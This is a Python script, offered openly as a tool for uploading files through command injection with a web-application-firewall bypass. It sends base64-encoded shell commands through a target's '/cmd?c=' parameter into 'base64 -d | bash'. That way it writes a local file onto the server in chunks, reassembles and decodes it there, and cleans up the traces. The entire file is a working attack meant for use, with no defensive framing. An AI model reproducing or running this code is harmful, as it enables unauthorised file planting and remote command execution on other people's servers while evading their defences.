import requests
import base64
import sys
import os
import math
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

def chunk_string(string, length):
    return [string[i:i+length] for i in range(0, len(string), length)]

def encode_command(command):
    return base64.b64encode(command.encode()).decode()

def normalize_url(url):
    # Remove trailing dots and spaces
    url = url.strip().rstrip('.')
    # Ensure URL has scheme
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def make_request(url, verify_ssl=True, max_retries=3):
    url = normalize_url(url)
    for attempt in range(max_retries):
        try:
            response = requests.get(
                url, 
                verify=verify_ssl, 
                timeout=30,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            return response
        except requests.exceptions.SSLError:
            print("SSL Error: If you trust the server, you can disable SSL verification with --insecure")
            return None
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                print(f"Connection error, retrying... (Attempt {attempt + 1}/{max_retries})")
                continue
            print("Connection error: Could not connect to the server")
            return None
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                print(f"Timeout, retrying... (Attempt {attempt + 1}/{max_retries})")
                continue
            print("Connection timeout: Server took too long to respond")
            return None
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {str(e)}")
            return None
    return None

def upload_file_by_chunks(file_path, server_url, chunk_size=100, verify_ssl=True):
    # Read and encode file to base64
    with open(file_path, 'rb') as file:
        file_content = base64.b64encode(file.read()).decode('utf-8')
    
    filename = os.path.basename(file_path)
    
    # Split base64 content into chunks
    chunks = chunk_string(file_content, chunk_size)
    
    print(f"Starting upload of {filename} in {len(chunks)} chunks...")
    
    # Create uploads directory if not exists
    mkdir_cmd = f"mkdir -p uploads"
    encoded_mkdir = encode_command(mkdir_cmd)
    response = make_request(f"{server_url}/cmd?c=echo {encoded_mkdir} | base64 -d | bash", verify_ssl)
    if not response:
        print("Failed to create uploads directory")
        return False
    
    # Upload each chunk to a numbered file
    for i, chunk in enumerate(chunks):
        # Create echo command for each chunk with numbered file
        echo_cmd = f"echo '{chunk}' > uploads/{filename}.part{i:04d}"
        encoded_cmd = encode_command(echo_cmd)
        
        # Send request with encoded command
        response = make_request(f"{server_url}/cmd?c=echo {encoded_cmd} | base64 -d | bash", verify_ssl)
        if not response:
            print(f"Error uploading chunk {i+1}")
            return False
        print(f"Chunk {i+1}/{len(chunks)} - Status: {response.status_code}")
    
    # Concatenate all chunks in order
    concat_cmd = f"cat uploads/{filename}.part* > uploads/{filename}"
    encoded_concat = encode_command(concat_cmd)
    response = make_request(f"{server_url}/cmd?c=echo {encoded_concat} | base64 -d | bash", verify_ssl)
    if not response:
        print("Failed to concatenate chunks")
        return False
    
    # Clean up temporary files
    cleanup_cmd = f"rm uploads/{filename}.part*"
    encoded_cleanup = encode_command(cleanup_cmd)
    response = make_request(f"{server_url}/cmd?c=echo {encoded_cleanup} | base64 -d | bash", verify_ssl)
    if not response:
        print("Warning: Failed to clean up temporary files")
    
    # Decode the file after all chunks are uploaded
    decode_cmd = f"cat uploads/{filename} | base64 -d > uploads/decoded_{filename}"
    encoded_decode = encode_command(decode_cmd)
    response = make_request(f"{server_url}/cmd?c=echo {encoded_decode} | base64 -d | bash", verify_ssl)
    if not response:
        print("Failed to decode the uploaded file")
        return False
    
    print(f"File {filename} has been uploaded and decoded successfully!")
    return True

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Upload file using command injection with WAF bypass')
    parser.add_argument('server_url', help='Server URL (e.g., https://example.com)')
    parser.add_argument('file_path', help='Path to file to upload')
    parser.add_argument('--insecure', action='store_true', help='Disable SSL verification')
    parser.add_argument('--chunk-size', type=int, default=500, help='Size of each chunk (default: 500)')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.file_path):
        print(f"Error: File {args.file_path} does not exist")
        sys.exit(1)
    
    upload_file_by_chunks(args.file_path, args.server_url, args.chunk_size, not args.insecure) 